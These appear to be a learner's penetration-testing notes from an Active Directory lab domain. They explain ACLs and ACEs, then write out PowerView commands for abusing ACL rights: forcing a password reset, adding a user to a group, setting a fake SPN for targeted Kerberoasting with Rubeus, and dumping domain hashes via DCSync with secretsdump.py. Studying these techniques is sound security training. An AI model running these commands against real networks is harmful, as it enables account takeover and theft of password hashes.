# ACE

<aside>
💡

ACLs are lists that define

1. who access to which asset
2. The level of access they are provisioned

Access control entries (ACEs) maps back to a user group or process (also known as security principals)

Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD

Types of ACLs:

- Discretionary ACL → defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access.
- System ACL → allows administrators to log access attempts made to secured objects
</aside>

- 3 types of ACEs

| **ACE** | **Description** |
| --- | --- |
| `Access denied ACE` | Used within a DACL to show that a user or group is explicitly denied access to an object |
| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object |
| `System audit ACE` | Used within a SACL to generate audit logs when a user or group 
attempts to access an object. It records whether access was granted or 
not and what type of access occurred |
- Each ACE has 4 components
1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects
can inherit the given ACE entry from the primary or parent object
4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object

# Enumerating ACL

## PowerView

- `Import-Module .\PowerVire.ps1`
- `$sid = Convert-NameToSid wley`
- `Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
    - In return we will get a guid which we can search on google
    `$guid= "00299570-246d-11d0-a768-00aa006e0529"`
- We can also simply use ResolveGUIDs
    - `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`

# Abusing ACLs

- Attack plan

<aside>
💡

1. Use the `wley` user to change the password for the `damundsen` user
2. Authenticate as the `damundsen` user and leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user
</aside>

- Creating a PSCredential Object for wley (we already know his password)
    - `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
    - `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`
- Creating a SecureStrgin Object
    - `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
- Changing the user’s password
    - We have ForcePasswordChange right so we can change his password using PowerView
    - `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`
- Creating a SecureString Object using damundsen
    - `$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
    - `$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)`
- Adding damundsen to the Help Desk Level 1 Group
    - `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
- Confirmation
    - `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName`
- Since adunn user is an admin account that cannot be interrupted we need another way of access. We have GenericAll access which means we can create a fake SPN and do a targeted Kerberoast attack
- Creating a fake spn
    - `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
- Kerberoasting with Rubeus
    - `.\Rubeus.exe kerberoast /user:adunn /nowrap`
    - And crack it
- Cleanup
    - Order is crucial
    1. Remove the fake SPN we created on the `adunn` user.
        1. `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`
    2. Remove the `damundsen` user from the `Help Desk Level 1` group
        1. `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`
        2. Confirm → `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'}`
    3. Set the password for the `damundsen` user back to its original value (if we know it) or have our client set it/alert the user
    

# DCSync

<aside>
💡

DCSync is a technique for stealing the AD password database using the built-int Directory Replication Service Remote Protocol (Used by DCs to replicate domain data)

</aside>

- SecretsDump.py
    - `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`
        - `-just-dc-ntlm` → only NTLM hashes
        - `-just-dc-user` <username> → only extract a specific user
        - `-pwd-last-set` → when each account’s password was las changed
        - `-history` → if we want to dump password history
        - `-user-status` → check if user is disabled
